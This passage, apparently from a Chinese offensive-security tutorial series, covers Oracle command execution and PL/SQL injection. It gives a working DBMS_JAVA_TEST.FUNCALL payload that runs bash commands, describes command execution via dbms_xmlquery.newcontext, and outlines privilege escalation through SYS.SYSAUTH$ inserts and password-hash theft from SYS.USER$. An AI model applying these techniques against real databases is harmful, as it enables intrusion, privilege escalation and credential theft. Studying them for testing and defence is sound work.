    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/sbin/ifconfig>/tmp/1.txt') FROM DUAL;
    

11g:  
![1626490666_60f2472a3bfec3586ec6a.png!small?1626490666603](https://image.3001.net/images/20210717/1626490666_60f2472a3bfec3586ec6a.png!small?1626490666603)  
成功创建文件：  
![1626490670_60f2472e732a0d2cb818d.png!small?1626490670820](https://image.3001.net/images/20210717/1626490670_60f2472e732a0d2cb818d.png!small?1626490670820)

10g:  
![1626490674_60f247329fa3c2205ae7b.png!small?1626490676721](https://image.3001.net/images/20210717/1626490674_60f247329fa3c2205ae7b.png!small?1626490676721)  
成功将命令写入文件  
![1626490678_60f247365f6efd63457d0.png!small?1626490678818](https://image.3001.net/images/20210717/1626490678_60f247365f6efd63457d0.png!small?1626490678818)

## 五、Web层面的利用

前面提到过Oracle并不支持堆叠注入，但是前面介绍的dbms_xmlquery.newcontext是可以执行PL/SQL语句的，因此当我们遇到Oracle的SQL注入点时，就可以构造执行dbms_xmlquery.newcontext的语句来进行命令执行

 **总结**

一般PL/SQL注入利用的条件：

    
    
    存在注入的PL/SQL属于高权限用户（一般关注SYS），且以definer权限执行
    

对用户权限的要求：

    
    
    如果用户没有CREATE PROCEDURE权限，则需要寻找数据库已有的辅助注入函数
    如果用户有CREATE PROCEDURE，则可以自己创建辅助注入函数
    

如果没有辅助注入函数的话：

    
    
    1、如果注入点是在execute immediate后的PL/SQL语句中，那么可以考虑直接注入匿名PL/SQL语句块
    2、如果存在注入的是insert、delete、update这三种类型的语句，那么我们就可以利用现有的语句进行增删改操作，特别是insert情况下可以通过将当前用户插入到SYS.SYSAUTH$表中，同样可获得DBA权限
    3、如果存在注入的是select这种类型的语句，那么我们就只能对数据库进行查询操作，如UNION SELECT PASSWORD FROM SYS.USER$，当然前提是它有输出
    

当遇到Web层面的SQL注入时，需要构造dbms_xmlquery.newcontext执行PL/SQL的语句来进行命令执行即可！！

## 六、总结

今天学到了PL/SQL
Injection的两种方法、oracle权限提升的四种方法、以及最后的命令执行的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）......
    

接下来在《服务攻防之数据库Redis（上）》会接触到如何进行Redis环境安装、Redis未授权访问、redis写webshell、redis
密钥登录ssh等操作，如何提权渗透等方法，请看下篇服务攻防之数据库Redis上篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

